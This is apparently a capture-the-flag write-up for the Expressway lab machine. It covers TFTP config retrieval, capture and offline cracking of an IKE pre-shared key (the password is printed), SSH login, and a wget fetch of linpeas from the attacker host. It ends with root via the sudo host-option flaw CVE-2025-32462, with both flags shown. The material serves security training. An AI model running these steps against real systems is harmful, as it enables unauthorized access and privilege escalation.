
---
## Reconaissance

An initial TCP scan revealed the following information abt running services

```
nmap -A -p- --min-rate 10000 10.129.238.52  
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-19 18:23 CDT
Nmap scan report for 10.129.238.52
Host is up (0.026s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=3/19%OT=22%CT=1%CU=40561%PV=Y%DS=2%DC=T%G=Y%TM=69BC857
OS:4%P=x86_64-pc-linux-gnu)SEQ(SP=100%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=102%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=105%GCD=1%ISR=103%TI=Z%
OS:CI=Z%TS=1)SEQ(SP=FE%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FF%GCD=1%IS
OS:R=10F%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M552ST11NW9%O2=M552ST11NW9%O3=M552NNT11
OS:NW9%O4=M552ST11NW9%O5=M552ST11NW9%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE8
OS:8%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW9%CC=Y%Q=)
OS:T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=
OS:0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T
OS:6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=1
OS:64%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 199/tcp)
HOP RTT      ADDRESS
1   55.34 ms 10.10.14.1
2   55.60 ms 10.129.238.52

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.40 seconds
```

An initial UDP scan revealed the following information abt running services.

```
nmap -sU --top-port=20 10.129.238.52
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-19 18:33 CDT
Nmap scan report for 10.129.238.52
Host is up (0.017s latency).

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   closed        ntp
135/udp   closed        msrpc
137/udp   closed        netbios-ns
138/udp   closed        netbios-dgm
139/udp   closed        netbios-ssn
161/udp   closed        snmp
162/udp   closed        snmptrap
445/udp   closed        microsoft-ds
500/udp   open          isakmp
514/udp   closed        syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  open|filtered nat-t-ike
49152/udp closed        unknown

Nmap done: 1 IP address (1 host up) scanned in 21.39 seconds
```

There seems to be an running services on port 500 open & maybe tftp on port 69, it seems filtered tho. Let's check it out. 

By default tftp doesn't require authentication.

Connected to the tftp server and downloaded the ciscortr.cfg file.

```
tftp 10.129.238.52       
tftp> get ciscortr.cfg
tftp>
```

Viewed it on local machine and found credentials.

```
username ike password *****
```

Let's check what the running udp service on port 500 is on google.
It's IKE, we can utilize ike-scan in order to extract further information.

```
ike-scan -M 10.129.238.52
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.238.52   Main Mode Handshake returned
        HDR=(CKY-R=c0e94044d92f3401)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.029 seconds (34.38 hosts/sec).  1 returned handshake; 0 returned notify
```

From the response, we see a field called AUTH with a value of PSK. This means that the VPN is configured with a Pre-Shared key. Also, from the output, we see the encryption is set to 3DES, and the hash is SHA1.

Let's attempt an aggressive scan with -A and use the --pskcrack option to retrieve the pre-shared key so we can crack it offline

```
ike-scan -M -A --pskcrack=k.hash 10.129.238.52
```

This scan automatically downloads an "k.hash" file onto our local machine.
We can crack it now.

If john the ripper doesn't work, use hashcat.

```
hashcat k.hash /usr/share/wordlists/rockyou.txt                     
hashcat (v7.1.2) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 7 4800H with Radeon Graphics, 5003/10007 MB (2048 MB allocatable), 4MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

5400 | IKE-PSK SHA1 | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (8269 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

f03e0fe818c47a8b5a503475f994cef517f36b8b30543b7e3d9211d5b8417749867ab0d1f1863a44e5fc70d9ff3f52506ae873e74dd8ce977c35cf0b30aaf46fe211590c4bbab461517469a5e6cd523148bcfa8d8824e8a5e84ab5eb4743548962001e410899ab2693cbb5e303b941458de9bc443bcb1fef0f3283698daba372:72a52a4fa3db197985eeb03c084ee6916f7d3ac1d435e456734d8929c81ff168b963824175b24a8aeb8f91a5c6612a35468d8b7bcf5670345524cbd7590b2442c8da71d3d37095b4f24d31a758a063cd6155c1f683dd79e18b10373b91f0adf66719c29722de852646bdbca207f9b21cdad2bf066d2daaa42fcfc3f853ffc406:5433c964f5b28dd3:c93d99ca2eaa4a34:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e68:747a32fd031e1815566242c241da5f494edcc59e:b4dfe47e2edd70a9dc09e9ac64847490ac759f1cf196b68700d42b0fbf10d920:7f3c59e72fdf5ca442c7eab4aae53b4f59bf9a2f:freakingrockstarontheroad
```

We now have user credentials.

```
ike:freakingrockstarontheroad
```

Connected to expressway.htb via SSH.

```
sh ike@10.129.238.52
ike@10.129.238.52's password: 
Last login: Wed Sep 17 12:19:40 BST 2025 from 10.10.14.64 on ssh
Linux expressway.htb 6.16.7+deb14-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.16.7-1 (2025-09-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Mar 19 23:59:35 2026 from 10.10.15.161
ike@expressway:~$
```

Retrieved user.txt in /home/ike directory.

```
9788a3967d242eba68aec46385922fab
```

Downloaded linpeas.sh onto target server.

```
wget http://10.10.15.161/linpeas.sh .
```

Ran it & retrieved following information:

```
sudo version 1.9.17
```

Vulnerable to CVE-2025-32462, which allows privesc using the -h option.
Users can use this option to list what permissions they have on different hosts.

When an user is part of the proxy group, he is able to read log files of an proxy service, in a lot of cases "squid" proxy.

```
$ id
uid=1001(ike) gid=1001(ike) groups=1001(ike),13(proxy)
```

Let's list the files this group can read.

```
find / -group proxy 2>/dev/null |grep -v '/proc\|/sys/\|/run'
/var/spool/squid
/var/spool/squid/netdb.state
/var/log/squid
/var/log/squid/cache.log.2.gz
/var/log/squid/access.log.2.gz
/var/log/squid/cache.log.1
/var/log/squid/access.log.1
```

Analyze those log files.
Judging from this log file we can see an subdomain called "offramp.expressway.htb".

Since we retrieved the sudo version information earlier and know it's vulnerable to CVE-2025-32462, for this exploit to work we can utilize the retrieved host and potentially display ike's permissions on the offramp.expressway.htb host.

```
sudo -h offramp.expressway.htb -l
Matching Defaults entries for ike on offramp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User ike may run the following commands on offramp:
    (root) NOPASSWD: ALL
    (root) NOPASSWD: ALL
```

He has full root perms without authentication required! 
Let's spawn an bash shell.

```
ike@expressway:/tmp$ sudo -h offramp.expressway.htb /bin/bash
root@expressway:/tmp#
```

Retrieved root.txt in /root directory.

```
947ce4e3ab52614736f786a2b4fc2c1b
```
